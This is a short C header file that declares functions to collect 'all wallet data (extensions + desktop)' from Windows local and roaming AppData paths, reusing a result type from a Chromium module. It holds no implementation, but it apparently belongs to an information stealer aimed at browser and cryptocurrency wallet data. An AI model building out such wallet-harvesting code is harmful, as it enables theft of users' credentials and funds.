#ifndef WALLETS_H
#define WALLETS_H

#include "chromium.h"  // Reuse CollectResult type

// Collect all wallet data (extensions + desktop)
CollectResult collect_wallets(const char *local_app_data, const char *roaming_app_data);

// Free wallet result
void free_wallet_result(CollectResult *result);

#endif
